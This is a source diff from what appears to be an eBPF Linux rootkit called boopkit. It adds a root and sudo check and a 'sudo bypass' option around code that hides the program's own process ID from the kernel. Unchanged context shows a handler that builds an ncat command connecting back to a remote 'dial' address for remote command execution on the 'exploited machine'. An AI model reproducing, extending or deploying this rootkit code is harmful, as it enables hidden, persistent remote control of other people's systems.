@@ -37,8 +37,6 @@
 #include "pr0be.skel.h"
 // clang-format on
 
-
-
 void asciiheader() {
   printf("\n\n");
   printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
@@ -69,7 +67,7 @@ void usage() {
 // finding whatever boop command will need to
 // be executed on the bookit exploited machine.
 void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
-  printf("  * Boop: %s\n ", dial);
+  printf("  ** Boop: %s\n ", dial);
   // -- Hacky implementation --
   char cmd[MAX_RCE_SIZE];
   sprintf(cmd, "ncat %s %d", dial, PORT);
@@ -83,25 +81,32 @@ void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
   // -- Hacky implementation --
 }
 
+// config is the configuration options for the program
 struct config {
+  int sudobypass;
   char pr0besafepath[PATH_MAX];
   char pr0bebooppath[PATH_MAX];
   int denyc;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
+// clisetup will initialize the config struct for the program
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
+  cfg.sudobypass = 1;
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
-  }else{
-    sprintf(cfg.pr0besafepath,"%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
-    sprintf(cfg.pr0bebooppath,"%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
+  } else {
+    sprintf(cfg.pr0besafepath, "%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
+    sprintf(cfg.pr0bebooppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
   }
   for (int i = 0; i < argc; i++) {
     if (argv[i][0] == '-') {
       switch (argv[i][1]) {
+        case 's':
+            cfg.sudobypass = 1;
+            break;
         case 'x':
           // Append deny addr
           strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
@@ -120,9 +125,40 @@ static struct env {
   int target_ppid;
 } env;
 
+// handlepidlookup is called everytime the kernel searches for our pid.
 static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
   const struct event *e = data;
   return 0;
+}
+
+void rootcheck(int argc, char **argv) {
+  long luid = (long) getuid();
+  printf("  -> getuid() : %ld\n", luid);
+  if (luid != 0) {
+    printf("  XX Invalid UID.\n");
+    if (!cfg.sudobypass){
+      printf("  XX Permission denied.\n");
+      exit(1);
+    }
+    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
+  }
+  long lpid = (long) getpid();
+  long lppid = (long) getppid();
+  printf("  -> getpid()  : %ld\n", lpid);
+  printf("  -> getppid() : %ld\n", lppid);
+  if (lpid - lppid == 1) {
+    // We assume we are running with sudo at this point!
+    // If the ppid() and pid() are close together this
+    // implies that the process tree has cascaded a new
+    // ppid() for the process. In other words, we are probably
+    // running with sudo (or similar).
+    printf("  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
+    if (!cfg.sudobypass) {
+      printf("  XX Permission denied.\n");
+      exit(1);
+    }
+    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
+  }
 }
 
 // main
@@ -131,8 +167,8 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
 int main(int argc, char **argv) {
   asciiheader();
   clisetup(argc, argv);
-
-  printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
+  rootcheck(argc, argv);
+  printf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
   // Return value for eBPF loading
   int loaded, err;
 
@@ -145,12 +181,10 @@ int main(int argc, char **argv) {
   printf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
   sfobj = pr0be_safe__open();
   char pid[MAXPIDLEN];
-
-  // So if we run the program with "sudo" we need to get the parent pid
-  // for now just assume this
+  // getpid()
   //
-  // TODO: @kris-nova throw an error if ran with sudo instead of real
-  // privileges!
+  // Note: We know that we can use getpid() as the rootcheck() function above
+  //       will manage ensuring we are executing this program without sudo
   env.pid_to_hide = getpid();
   sprintf(pid, "%d", env.pid_to_hide);
   printf("  -> Obfuscating PID: %s\n", pid);
